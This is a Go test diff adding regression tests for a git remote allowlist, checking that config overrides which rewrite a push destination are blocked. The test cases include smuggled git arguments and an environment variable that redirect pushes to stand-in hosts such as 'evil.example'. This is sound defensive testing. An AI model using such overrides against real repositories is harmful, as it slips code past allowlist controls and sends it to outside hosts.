@@ -163,6 +163,58 @@ func TestRemoteAllowlistAllowsApprovedHost(t *testing.T) {
 	}
 }
 
+// TestRemoteRewriteOverrideBlocked is the SEC-4/H-29 regression: a config
+// override that can rewrite the remote at connect time (insteadOf, pushurl) must
+// block a remote-facing command, even if the positional remote resolves to an
+// allowed URL.
+func TestRemoteRewriteOverrideBlocked(t *testing.T) {
+	stubGitQuery(t, func(string, ...string) (string, error) {
+		return "https://internal.example/team/x", nil // the clean, allowed URL
+	})
+
+	pol := allowlistPolicy("internal.example")
+
+	cases := [][]string{
+		{"-c", "url.https://127.0.0.1/.insteadOf=https://internal.example/", "push", "origin", "main"},
+		{"-c", "remote.origin.pushurl=https://evil.example/x", "push", "origin"},
+		{"--config-env", "url.x.insteadOf=EVIL", "push", "origin"},
+		{"--config-env=url.x.pushInsteadOf=EVIL", "push", "origin"},
+	}
+
+	for _, args := range cases {
+		if code, blocked := enforceRemoteAllowlist(pol, args, "git"); !blocked || code != 1 {
+			t.Errorf("rewrite override must block: args=%v code=%d blocked=%v", args, code, blocked)
+		}
+	}
+}
+
+// TestBenignConfigNotBlocked confirms an unrelated -c override does not trip the
+// rewrite gate (only remote-rewriting keys do).
+func TestBenignConfigNotBlocked(t *testing.T) {
+	stubGitQuery(t, func(string, ...string) (string, error) {
+		return "https://internal.example/team/x", nil
+	})
+
+	pol := allowlistPolicy("internal.example")
+	if _, blocked := enforceRemoteAllowlist(pol, []string{"-c", "core.pager=less", "push", "origin"}, "git"); blocked {
+		t.Error("a benign -c override must not be blocked")
+	}
+}
+
+// TestRemoteRewriteViaEnv covers the GIT_CONFIG_KEY_* environment vector.
+func TestRemoteRewriteViaEnv(t *testing.T) {
+	stubGitQuery(t, func(string, ...string) (string, error) {
+		return "https://internal.example/team/x", nil
+	})
+
+	t.Setenv("GIT_CONFIG_KEY_0", "url.https://evil/.insteadOf")
+
+	pol := allowlistPolicy("internal.example")
+	if code, blocked := enforceRemoteAllowlist(pol, []string{"push", "origin"}, "git"); !blocked || code != 1 {
+		t.Errorf("GIT_CONFIG_KEY rewrite must block: code=%d blocked=%v", code, blocked)
+	}
+}
+
 func TestIsExecFailure(t *testing.T) {
 	if isExecFailure(nil) {
 		t.Error("nil is not a failure")
